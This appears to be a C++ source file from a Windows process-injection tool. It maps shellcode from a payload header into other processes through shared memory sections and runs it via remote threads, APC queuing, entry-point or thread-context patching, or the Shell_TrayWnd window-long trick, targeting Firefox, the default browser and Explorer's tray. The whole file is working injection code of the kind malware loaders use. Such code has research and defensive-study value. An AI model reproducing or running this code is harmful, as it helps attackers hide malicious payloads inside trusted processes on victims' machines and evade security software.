#include <Windows.h>
#include <iostream>

#include "main.h"
#include "createproc.h"
#include "enumproc.h"

#include "payload.h"

typedef enum {
    ADD_THREAD,
    ADD_APC,
    PATCH_EP,
    PATCH_CONTEXT
} INJECTION_POINT;

typedef enum {
    EXISTING_PROC,
    NEW_PROC,
    TRAY_WINDOW
} TARGET_TYPE;


using namespace std;

PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = shellcodeSize;
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section handle: %x\n", hSection);

    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
    printf("Shellcode copied!\n");

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return sectionBaseAddress2;
}

//for injection into Shell_TrayWnd
PVOID map_handles_into_process(HANDLE hProcess, LPVOID shellcode_ptr)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = sizeof(LPVOID) * 2; //we need space for 2 handles
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section handle: %x\n", hSection);

    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    PVOID buf_va = (BYTE*)sectionBaseAddress2;
    DWORD hop1 = (DWORD)buf_va + sizeof(DWORD);
    DWORD shellc_va = (DWORD)shellcode_ptr;

    memcpy((BYTE*)sectionBaseAddress, &hop1, sizeof(DWORD));
    memcpy((BYTE*)sectionBaseAddress  + sizeof(DWORD), &shellc_va, sizeof(DWORD));

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return sectionBaseAddress2;
}

bool inject_in_new_process(INJECTION_POINT mode)
{
    //get target path
    WCHAR cmdLine[MAX_PATH];
    get_default_browser(cmdLine, MAX_PATH);

    WCHAR startDir[MAX_PATH];
    if (!get_dir(cmdLine, startDir)) {
        GetSystemDirectory(startDir, MAX_PATH);
    }
    //create suspended process
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    if (create_new_process2(pi, cmdLine, startDir) == false) {
        return false;
    }
    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
    switch (mode) {
    case ADD_THREAD:
        run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
        // not neccessery to resume the main thread
        break;
    case ADD_APC:
        add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    case PATCH_EP:
        paste_shellcode_at_ep(pi.hProcess, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    case PATCH_CONTEXT:
        patch_context(pi.hThread, remote_shellcode_ptr);
        ResumeThread(pi.hThread); //resume the main thread
        break;
    }
    
    //close handles
    ZwClose(pi.hThread);
    ZwClose(pi.hProcess);
    return true;
}

bool inject_in_existing_process()
{
    HANDLE hProcess = find_running_process(L"firefox.exe");
    LPVOID remote_shellcode_ptr = map_code_into_process(hProcess, g_Shellcode, sizeof(g_Shellcode));
    if (remote_shellcode_ptr == NULL) {
        return false;
    }
    return run_shellcode_in_new_thread(hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
}

bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HWND hWnd = FindWindow(L"Shell_TrayWnd", NULL);
    if (hWnd == NULL) return false;

    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);
    printf("PID:\t%p\n", pid);

   
    LONG winLong = GetWindowLongW(hWnd, DWL_MSGRESULT);
    printf("WindowLong:\t%p\n", winLong);

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, false, pid);
    if (hProcess == NULL) {
        return false;
    }

    LPVOID remote_shellcode_ptr = map_code_into_process(hProcess, shellcode, shellcodeSize);
    if (remote_shellcode_ptr == NULL) {
        return false;
    }
    LPVOID remote_handles_ptr = map_handles_into_process(hProcess, remote_shellcode_ptr);
    if (remote_handles_ptr == NULL) {
        return false;
    }
    
    LONG handlesPtr = (LONG) remote_handles_ptr;
    printf("Saving handles to:\t%p\n", handlesPtr);

    //restore the previous value:
    SetWindowLong(hWnd, DWL_MSGRESULT, handlesPtr);

    //send signal to execute the injected code
    SendNotifyMessage(hWnd, WM_PAINT, 0, 0);

    //procedure will be triggered on every message
    //in order to avoid repetitions, injected code should restore the previous value after the first exection
    //here we are checking if it is done
    size_t max_wait = 5;
    while (GetWindowLong(hWnd, DWL_MSGRESULT) != winLong) {
        //not restored, wait more
        Sleep(100);
        if ((max_wait--) == 0) {
            //don't wait longer, restore by yourself
            SetWindowLong(hWnd, DWL_MSGRESULT, winLong);
            SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
        }
    }    
    CloseHandle(hProcess);
    return true;
}

int main()
{
   if (load_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }
    if (load_kernel32_functions() == FALSE) {
        printf("Failed to load KERNEL32 function\n");
        return (-1);
    }

    TARGET_TYPE targetType = TARGET_TYPE::EXISTING_PROC;

    switch (targetType) {
    case TARGET_TYPE::TRAY_WINDOW:
        // this injection is more fragile, use shellcode that makes no assumptions about the context
        if (inject_into_tray(g_Shellcode2, sizeof(g_Shellcode2))) {
             printf("[SUCCESS] Code injected into tray window!\n");
             break;
        }
    case TARGET_TYPE::EXISTING_PROC:
        if (inject_in_existing_process()) {
            printf("[SUCCESS] Code injected in existing process!\n");
            break;
        }
    case TARGET_TYPE::NEW_PROC:
        if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
             printf("[SUCCESS] Code injected in a new process!\n");
             break;
        }
    }

    system("pause");
    return 0;
}
